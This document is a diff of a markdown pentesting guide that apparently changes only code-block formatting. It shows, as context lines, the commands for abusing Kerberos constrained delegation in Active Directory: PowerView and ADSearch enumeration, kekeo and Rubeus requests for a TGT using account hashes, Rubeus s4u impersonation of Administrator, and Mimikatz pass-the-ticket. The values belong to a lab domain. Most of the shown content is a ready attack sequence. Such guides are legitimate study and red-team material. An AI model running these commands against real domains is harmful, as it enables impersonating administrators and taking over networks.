@@ -31,7 +31,7 @@ Moreover, you **won't only have access to the service that the user is able to i
 
 Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
 
-{% code title="Enumerate" %}
+
 ```bash
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -40,9 +40,9 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 #ADSearch
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
-{% endcode %}
 
-{% code title="Get TGT" %}
+
+
 ```bash
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -61,7 +61,7 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
-{% endcode %}
+
 
 
 There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory Certificate Service abuse
@@ -69,7 +69,7 @@ There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** wit
 **Just having that TGT ticket (or hashed) you can perform this attack without compromising the whole computer.**
 
 
-{% code title="Using Rubeus" %}
+
 ```bash
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -86,9 +86,9 @@ There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** wit
 #Load ticket in memory
 .\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
 ```
-{% endcode %}
 
-{% code title="kekeo + Mimikatz" %}
+
+
 ```bash
 #Obtain a TGT for the Constained allowed user
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
@@ -99,7 +99,7 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'  
 ```
-{% endcode %}
+
 
 ### Mitigation
 
